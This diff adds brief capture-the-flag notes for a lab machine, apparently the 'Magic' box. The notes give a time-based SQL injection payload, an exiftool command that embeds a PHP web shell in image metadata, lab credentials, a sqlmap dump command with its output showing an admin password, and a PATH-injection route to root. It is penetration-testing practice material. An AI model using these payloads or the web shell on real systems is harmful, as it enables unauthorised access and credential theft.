@@ -1,0 +1,25 @@
+nmap -->> port 80 -->> login page
+sql injection -->> payload : admin';WAITFOR DELAY '0:0:5'--
+upload image (jpeg, jpg, png) -->> exiftool to embed shell in metadata : exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
+using webshell -->> db.php5 -->> creds = theseus : iamkingtheseus (use these creds as input to sqlmap to get more creds) -->> user.txt
+	~ sqlmap -u http://10.10.10.185/login.php --dbms=MySQL --dbms-cred=theseus:iamkingtheseus -D Magic -T login --forms --dump
+	
+		[23:58:02] [INFO] retrieved: id
+		[23:58:06] [INFO] retrieved: username
+		[23:58:16] [INFO] retrieved: password
+		[23:58:26] [INFO] fetching entries for table 'login' in database 'Magic'
+		[23:58:26] [INFO] fetching number of entries for table 'login' in database 'Magic'
+		[23:58:26] [INFO] retrieved: 1
+		[23:58:27] [INFO] retrieved: 1
+		[23:58:43] [INFO] retrieved: Th3s3usW4sK1ng
+		[23:59:16] [INFO] retrieved: admin
+		Database: Magic
+		Table: login
+		[1 entry]
+		+------+----------+----------------+
+		| id   | username | password       |
+		+------+----------+----------------+
+		| 1    | admin    | Th3s3usW4sK1ng |
+		+------+----------+----------------+
+
+linpeas.sh -->> suid bin -->> sysinfo -->> path modification -->> strings on sysinfo -->> binary uses lshw and fdisk -->> PATH injection and service manipulation -->> root
